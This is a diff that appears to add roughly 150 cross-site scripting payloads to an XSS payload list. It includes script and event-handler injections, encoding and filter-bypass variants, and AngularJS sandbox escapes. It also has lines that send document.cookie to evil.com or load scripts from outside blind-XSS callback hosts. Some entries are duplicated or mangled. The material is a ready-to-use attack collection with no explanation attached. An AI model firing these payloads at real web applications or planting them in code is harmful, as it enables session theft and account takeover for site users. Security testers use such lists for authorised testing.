@@ -12,6 +12,153 @@
 <img src/onerror=prompt(8)>
 <image src =q onerror=prompt(8)>
 <img src =q onerror=prompt(8)>
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+<script     >alert(1)</script>
+<ScRipT>alert(1)</sCriPt>
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+<script     >alert(1)</script>
+<ScRipT>alert(1)</sCriPt>
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+<img/src=x a='' onerror=alert(1)>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<img src=`x`onerror=alert(1)>
+<img src='/' onerror='alert("kalisa")'>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<BODY ONLOAD=alert('XSS')>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http:/evil.com/xss.js?< B >
+"><XSS<test accesskey=x onclick=alert(1)//test
+<svg><discard onbegin=alert(1)>
+<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{{}.")));alert(1)//"}}
+{{{}.")));alert(1)//"}}
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
+“><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+javascript:alert(document.cookie)
+\“-alert(1)}//
+<><img src=1 onerror=alert(1)>
+<script>onerror=alert;throw 1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>location='javascript:alert\x281\x29'</script>
+<script>alert`1`</script>
+<script>new Function`X${document.location.hash.substr`1`}`</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+“onmouseover=“alert(1)
+‘-alert(1)-’
+‘}alert(1);{‘
+‘}alert(1)%0A{‘
+\’}alert(1);{//
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+\’-alert(1)//
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+<svg<script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="[JS-F**k Payload]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
+1/4script3/4alert(¢xss¢)1/4/script3/4
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+Quick Defense:
+<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle="aler\u0074(1)">
+1/4script3/4alert(¢xss¢)1/4/script3/4
+'';!--"<XSS>=&{()}
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script src=data:&comma;alert(1)//
+script tag filter bypass:
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+<script     >alert(1)</script>
+<ScRipT>alert(1)</sCriPt>
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+<BASE HREF="javascript:alert('XSS');//">
+<DIV STYLE="width: expression(alert('XSS'));">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss onclick="alert(1)">test</xss>
+<xss onmousedown="alert(1)">test</xss>
+<body onresize=alert(1)>”onload=this.style.width=‘100px’>
+<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
+<img src="x:gif" onerror="window'al\u0065rt'"></img>
+<img src=x onerror=alert(1)>
+"><script src=https://mrco.bxss.in></script>
+\u0022\u003c%26quot;%26gt;%26lt;"';}};“></SCRIPT><img src=x onerror=alert(69)>${{7*7}}
+':"/><script/src=//nirru.bxss.in/
+"/><script/src=//nirru.bxss.in/
+Svg Only=1 OnLoad=confirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgUm95elNlYw=="))>
+%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
+javascript:alert(1)
+“onmouseover=alert(1);”
+‘);alert(1);//
++%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--
+<body+onload=alert()>
+"><svg/onload=alert(1)>
+<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"><script>alert("xss");</script>
+<div onmouseover="alert('XSS');">Hello :) 
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script src=data:&comma;alert(1)//
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
 </scrip</script>t><img src =q onerror=prompt(8)>
 <script\x20type="text/javascript">javascript:alert(1);</script>
 <script\x3Etype="text/javascript">javascript:alert(1);</script>
